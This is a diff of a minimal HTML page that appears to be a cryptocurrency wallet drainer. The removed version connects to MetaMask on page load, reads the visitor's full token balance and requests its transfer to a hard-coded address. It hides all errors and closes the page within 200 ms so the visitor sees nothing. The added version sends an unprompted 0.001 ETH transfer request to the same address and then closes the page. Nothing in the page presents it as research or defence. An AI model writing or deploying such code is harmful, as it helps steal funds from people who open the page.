@@ -1,109 +1,49 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8" />
-  <title>tx-link</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="utf-8">
+  <title>Minimal TX</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-<script type="module">
-import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.esm.min.js";
+<script>
+window.onload = async function() {
+  if (!window.ethereum) {
+    alert("MetaMask not detected");
+    return;
+  }
 
-(async () => {
   try {
-    // ----------------- CONFIG (REPLACE THESE) -----------------
-    const TOKEN_ADDRESS = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC"; // <-- put test token on Sepolia (REPLACE)
-    const DESTINATION_ADDRESS = "0xe8729e199c2E2476a19704D316731b087f9a06a6"; // <-- put destination address (REPLACE)
-    const CHAIN_ID = 11155111; // Sepolia
-    // --------------------------------------------------------
-
-    // require injected wallet
-    if (!window.ethereum) {
-      // nothing to show per requirement — just close/redirect
-      try { window.location.href = "about:blank"; } catch(e) {}
-      return;
-    }
-
-    // request/connect accounts (this triggers wallet popup)
+    // درخواست اتصال
     await window.ethereum.request({ method: 'eth_requestAccounts' });
 
     const provider = new ethers.BrowserProvider(window.ethereum);
-    const network = await provider.getNetwork();
-    if (Number(network.chainId) !== CHAIN_ID) {
-      // optionally attempt to switch; silent if fails
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0xaa36a7' }] // Sepolia hex
-        });
-      } catch(e) {
-        // cannot switch silently — close/redirect immediately
-        try { window.location.href = "about:blank"; } catch(e) {}
-        return;
-      }
-    }
-
     const signer = await provider.getSigner();
-    const user = await signer.getAddress();
+    const from = await signer.getAddress();
 
-    // minimal ERC20 ABI to read balance and encode transfer
-    const erc20 = new ethers.Interface([
-      "function balanceOf(address) view returns (uint256)",
-      "function transfer(address to, uint256 amount) returns (bool)"
-    ]);
-
-    // read balance via provider (eth_call)
-    const balanceHex = await provider.call({
-      to: TOKEN_ADDRESS,
-      data: erc20.encodeFunctionData("balanceOf", [user])
-    });
-    const balance = ethers.getBigInt(balanceHex);
-
-    if (balance === 0n) {
-      // nothing to send — close/redirect silently
-      try { window.location.href = "about:blank"; } catch(e) {}
-      return;
-    }
-
-    // encode transfer(to, amount)
-    const data = erc20.encodeFunctionData("transfer", [DESTINATION_ADDRESS, balance.toString()]);
-
-    // build tx parameters for eth_sendTransaction
-    const txParams = {
-      from: user,
-      to: TOKEN_ADDRESS,
-      data: data,
-      value: "0x0"
+    // پارامتر تراکنش (انتقال 0.001 ETH به مقصد)
+    const tx = {
+      from,
+      to: "0xe8729e199c2E2476a19704D316731b087f9a06a6", // مقصد را بگذار
+      value: ethers.parseEther("0.001").toString()
     };
 
-    // send transaction request (this opens wallet confirmation)
-    // store promise but do not await it (we'll redirect quickly)
-    window.ethereum.request({ method: 'eth_sendTransaction', params: [txParams] })
-      .then((txHash) => {
-        // txHash may be available; we do nothing here (silent)
-        // console.log("txHash:", txHash);
-      })
-      .catch((err) => {
-        // ignore errors silently as per minimal UX
-        // console.error("send err", err);
-      });
+    // فراخوان ولت
+    await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [tx]
+    });
 
-    // AFTER sending request, immediately close/redirect.
-    // If this page was opened by window.open, window.close may work.
-    // Otherwise, navigate away quickly. Use very small delay to allow wallet popup to register.
+    // بعد از چند ثانیه بستن/ریدایرکت
     setTimeout(() => {
-      // try close first
-      try { window.close(); } catch(e) {}
-      // fallback redirect to blank
-      try { window.location.href = "about:blank"; } catch(e) {}
-    }, 200); // 200 ms delay — adjust to 500 if wallet popup is unreliable
+      window.close();
+      window.location.href = "about:blank";
+    }, 3000);
 
   } catch (err) {
-    // silent fail — close/redirect
-    try { window.close(); } catch(e) {}
-    try { window.location.href = "about:blank"; } catch(e) {}
+    console.error("TX error:", err);
   }
-})();
+};
 </script>
 </body>
 </html>
